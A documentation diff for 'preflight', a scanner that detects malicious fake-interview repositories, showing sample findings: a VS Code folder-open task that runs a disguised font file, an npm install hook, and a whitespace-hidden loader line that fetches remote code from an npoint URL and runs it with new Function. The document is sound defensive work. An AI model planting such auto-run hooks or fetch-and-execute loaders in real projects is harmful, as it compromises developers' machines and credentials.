@@ -15,21 +15,25 @@ a backdoor. The task usually executes a file disguised as a font or image, padde
 whitespace so the malicious code sits off-screen.
 
 ```console
-$ preflight clone https://github.com/recruiter/interview-task
+$ preflight clone https://github.com/recruiter/trading-dashboard
 
-  DANGER   interview-task   score 100/100   5 files scanned
+  DANGER   trading-dashboard   score 100/100   7 files scanned
 
- [CRITICAL] .vscode/tasks.json:4  PF101 vscode-folderopen-task
-            Task "setup-fonts" runs automatically when the folder is opened
+ [CRITICAL] .vscode/tasks.json:6  PF101 vscode-folderopen-task
+            Task "prepare-assets" runs automatically when the folder is opened
             → node public/fonts/fa-solid-900.woff2
 
- [CRITICAL] .vscode/tasks.json:4  PF001 auto-exec-chain
+ [CRITICAL] .vscode/tasks.json:6  PF001 auto-exec-chain
             Opening the folder in VS Code executes public/fonts/fa-solid-900.woff2,
             which contains: disguised-file, decode-and-execute
 
- [CRITICAL] package.json:1  PF001 auto-exec-chain
-            Installing dependencies executes server/setup.js,
-            which contains: remote-code-execution, payload-host
+ [CRITICAL] package.json:8  PF001 auto-exec-chain
+            Installing dependencies executes server/config.js,
+            which contains: offscreen-code, remote-code-execution, payload-host
+
+ [HIGH]     server/config.js:1  PF701 offscreen-code
+            Code is hidden after a long run of whitespace, past the edge of the editor
+            → const _0x=require('https');_0x.get('https://api.npoint.io/5d3f9c1a',r=>{…new Function(d)()})
  ...
  Do not open this repository in VS Code/Cursor, run npm install, or start an AI agent in it.
 ```
